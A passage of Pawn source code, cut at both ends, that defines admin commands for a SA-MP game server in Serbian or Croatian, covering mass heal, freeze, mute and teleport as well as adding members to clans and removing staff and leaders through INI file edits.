        // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/spawn [ ID/Deo imena ]." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete to suvlasniku i owneru!" );

		Novi_SetSpawnInfo( id );
		SpawnPlayer( id );

		format( globalstring, sizeof( globalstring ), "|A| %s spavnan si ponovno od Admin-a %s", ImeIgraca( id ), ImeIgraca( playerid ) );
		SCM( id, ANTICHEAT, globalstring );
	   	format( globalstring, sizeof( globalstring ), "| SPAWN | %s je spavnan ponovno od Admin-a %s", ImeIgraca( id ), ImeIgraca( playerid ) );
		AdminPoruka( 0x9ACD32AA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:healall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI ) {
				Novi_SetPlayerHealth( i, 150 );
			}
		}
	    format( globalstring, sizeof( globalstring ), "HEALALL | %s je svim igracim napunio helte.", ImeIgraca( playerid ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}


CMD:freezeall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI ) {
				TogglePlayerControllable( i, false );
			}
		}
	    format( globalstring, sizeof( globalstring ), "FREEZEALL | %s je zaledio sve igrace.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:muteall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI && PlayerInfo[i][xAdmin] >= 5 ) {
				PlayerInfo[ i ][ xMute ] = 100;
			}
		}
	    format( globalstring, sizeof( globalstring ), "MUTEALL | %s je mutirao sve igrace.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:gethereall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new Float:x, Float:y, Float:z;
		GetPlayerPos( playerid, x, y, z );
		foreach( Player, i ) {
			if( i != IPI && i != playerid ) {
			    new rand = random(10);
			    Novi_SetPlayerPos( i, x+rand, y+rand, z );
				SetPlayerInterior( i, GetPlayerInterior( playerid ) );
				SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
			}
		}
	    format( globalstring, sizeof( globalstring ), "GETHEREALL | %s je teleportovao sve igrace do sebe.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
 
CMD:unmuteall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI ) {
				PlayerInfo[ i ][ xMute ] = 0;
			}
		}
	    format( globalstring, sizeof( globalstring ), "UNMUTEALL | %s je odmutirao sve igrace.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unfreezeall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI ) {
				TogglePlayerControllable( i, true );
			}
		}
	    format( globalstring, sizeof( globalstring ), "UNFREEZEALL | %s je odledio sve igrace.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

alias:sethp("postavihp", "izleci");
CMD:sethp( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, zivot;
		if( sscanf( params, "ui", id, zivot ) ) return SendUsageMessage( playerid, "/sethp [ ID/Deo imena] [ Helti ]." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete to suvlasniku i ownerima!" );
		Novi_SetPlayerHealth( id, zivot );
		SendInfoMessage( playerid, "Postavili ste igracu %s helte na %d.", ImeIgraca( id ), zivot );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:izbaciclana( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
    
    	if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
		new igrac;
		if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/izbaciclana [ ID/Deo imena ]." );
		if( igrac == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ igrac ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Taj igrac nije u organizaciji." );
        if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je lider." );
		new OrgID = PlayerInfo[ igrac ][ xClan ], name[ MAX_PLAYER_NAME ];
		GetPlayerName( igrac, name, sizeof( name ) );

        if( strcmp( name, OI[ OrgID ][ oClan1 ], true ) == 0) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
		else if( strcmp( name, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan14 ], true ) == 0) { strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan15 ], true ) == 0) { strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan16 ], true ) == 0) { strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan17 ], true ) == 0) { strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( name, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }

		OI[ OrgID ][ oUbacenihClanova ]--;

    	ResetAllWeapons( igrac );
		PlayerInfo[ igrac ][ xClan ] = 0; PlayerInfo[ igrac ][ xRank ] = 0; PlayerInfo[ igrac ][ xSpawn ] = SetRandomSpawn(  ); SaveOrganization( OrgID );
        PlayerInfo[ igrac ][ xOrgUgovor ] = 0; SavePlayer( igrac ); PlayerInfo[ igrac ][ xSkin ] = SetSexSkin( igrac ); PostaviSkin( igrac, SetSexSkin( igrac ) );
		
	    SendClientMessageEx( igrac, CRVENA, "Izbacen si iz organizcaije od Admin-a %s", ImeIgraca( playerid ) );
	    SendClientMessageEx( playerid, CRVENA, "Izbacili ste igraca %s iz organizacije", ImeIgraca( igrac ) );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smeniadmina( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
		new imeigraca[ 24 ], ifile[ 64 ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smeniAdmin [ Ime_Prezime ]." );
        format( ifile, sizeof( ifile ), I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "Admin", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );

		SendClientMessageEx( playerid, CRVENA, "Smenili ste offline Admin-a %s", imeigraca );

		new string1[ 128 ]; 
		format( string1, sizeof( string1 ), "Vlasnik %s je smenio %s sa pozicije Admin-a", ImeIgraca( playerid ), imeigraca );
		LogSave( "Ostalo/LogSmjeniAdmina.log", string1 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenipromotera( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[ playerid ][ xSkriptaRank ] == 5 ) {
    
		new imeigraca[ 24 ], ifile[ 64 ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenipromotera [ Ime_Prezime ]." );
        format( ifile, sizeof( ifile ), I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "Promoter", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );

		SendClientMessageEx( playerid, CRVENA, "Smenili ste offline promotera %s", imeigraca );

	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenihelpera( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[ playerid ][ xSupporter ] >= 3 || PlayerInfo[playerid][xSkriptaRank] == 7) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new imeigraca[ 24 ], ifile[ 64 ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenihelpera [ Ime_Prezime ]." );
        format( ifile, sizeof( ifile ), I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "RPTeacher", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );
		SendClientMessageEx( playerid, CRVENA, "Smenili ste offline helpera %s", imeigraca );

		new string1[ 128 ]; 
		format( string1, sizeof( string1 ), "Admin %s je smenio %s sa pozicije Helpera", ImeIgraca( playerid ), imeigraca );
		LogSave( "Ostalo/LogSmjeniGS.log", string1 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ubaciclana( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
    
		if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
		new igrac, OrgID;
	    if( sscanf( params, "iu", OrgID, igrac ) ) return SendUsageMessage( playerid, "/ubaciclana [ ID orge ] [ ID igraca ]." );
	 	if( igrac == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
	 	if( PlayerInfo[ igrac ][ xLicnaKarta ] == 0 && PlayerInfo[ igrac ][ xPasos ] == 0) return SendErrorMessage( playerid, "Igrac nema licnu kartu i pasos!" );
	 	if( PlayerInfo[ igrac ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
	 	if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
		if( PlayerInfo[ igrac ][ xKazneniUgovor ] != 0 ) return SendErrorMessage( playerid, "Igrac ima kazneni ugovor napustanja organizacije!");
        new ImaFajl[ 40 ];
	    format( ImaFajl, sizeof( ImaFajl ), O_FILE, OrgID );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi." );

        if(OI[OrgID][oTip] == ORG_TIP_PD && PlayerInfo[igrac][xPolicijaTest] == 0) return SendErrorMessage(playerid, "Igrac nema polozen PD test!");

        if( OI[ OrgID ][ oUbacenihClanova ] >= OI[ OrgID ][ oMaxClanova ] ) return SendErrorMessage( playerid, "Ova organizacija vec ima ubacenih maksimalnih %d clanova.", OI[ OrgID ][ oMaxClanova ] );

        if( !strcmp( OI[ OrgID ][ oClan1 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan1 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
   		else if( !strcmp( OI[ OrgID ][ oClan2 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan2 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan3 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan3 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan4 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan4 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan5 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan5 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan6 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan6 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan7 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan7 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan8 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan8 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan9 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan9 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan10 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan10 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan11 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan11 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan12 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan12 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan13 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan13 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan14 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan14 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan15 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan15 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan16 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan16 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan17 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan17 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan18 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan18 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan19 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan19 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan20 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan20 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan21 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan21 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan22 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan22 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan23 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan23 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan24 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan24 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan25 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan25 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan26 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan26 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan27 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan27 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan28 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan28 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan29 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan29 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else if( !strcmp( OI[ OrgID ][ oClan30 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan30 ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), ORG_CLAN  ); }
	    else return SendErrorMessage( playerid, "Ta orga maksimalna broj clanova!" );

        OI[ OrgID ][ oUbacenihClanova ]++;
		PlayerInfo[ igrac ][ xClan ] = OrgID; PlayerInfo[ igrac ][ xRank ] = 1; PlayerInfo[ igrac ][ xSpawn ] = SPAWN_BAZA;
        if( PlayerInfo[ igrac ][ xPol ] == 1 ) {
			PlayerInfo[ igrac ][ xSkin ] = OI[ OrgID ][ oSkin1 ]; PostaviSkin( igrac, OI[ OrgID ][ oSkin1 ] );
			
		}
		else if( PlayerInfo[ igrac ][ xPol ] == 2 ) {
			PlayerInfo[ igrac ][ xSkin ] = OI[ OrgID ][ oZSkin1 ]; PostaviSkin( igrac, OI[ OrgID ][ oZSkin1 ] );
			
		}

		PlayerInfo[ igrac ][ xOrgUgovor ] = 0; SavePlayer( igrac ); SaveOrganization( OrgID );
	    SendInfoMessage( igrac, "Cestitamo, ubaceni ste od Admin TEAM-a u organizaciju %s.", getOrgName( OrgID ) );
	    SendInfoMessage( playerid, "Ubacili ste igraca %s u organizaciju %s", ImeIgraca( igrac ), OI[ OrgID ][ oName ] );
	}
	return 1;
}

CMD:smenilidera( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
    
        if( PlayerInfo[ playerid ][ xAdmin ] > 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
        new imeigraca[ 24 ], ifile[ 64 ], OrgID, oFile[ 40 ];
	    if( sscanf( params, "ds[24]", OrgID, imeigraca ) ) return SendUsageMessage( playerid, "/smenilidera [ ID organizacije ] [ Ime_Prezime ]." );
        format( ifile, sizeof( ifile ), I_FILE, imeigraca ); format( oFile, sizeof( oFile ), O_FILE, OrgID );
        if( !fexist( oFile ) ) return SendErrorMessage( playerid, "Ova organizacija ne postoji." );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

		if( strcmp( imeigraca, OI[ OrgID ][ oLider1 ], true ) == 0) { strmid( OI[ OrgID ][ oLider1 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oLider2 ], true ) == 0) { strmid( OI[ OrgID ][ oLider2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else return SendErrorMessage( playerid, "Taj lider nije u izabranoj organizaciji!" );

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "Lider", 0 );
		INI_WriteInt( File, "Clan", 0 );
		INI_WriteInt( File, "Rank", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );
        SaveOrganization( OrgID );
		SendClientMessageEx( playerid, CRVENA, "Izbacili ste lidera %s iz organizacije %s", imeigraca, OI[ OrgID ][ oName ] );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:spisakclanova( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
    
        if( PlayerInfo[ playerid ][ xAdmin ] > 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
        new OrgID, string[ 64 ], oFile[ 40 ];
        if( sscanf( params, "i", OrgID ) ) return SendUsageMessage( playerid, "/spisakclanova [ ID organizacije ]." );
        format( oFile, sizeof( oFile ), O_FILE, OrgID );
        if( !fexist( oFile ) ) return SendErrorMessage( playerid, "Ova organizacija ne postoji." );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
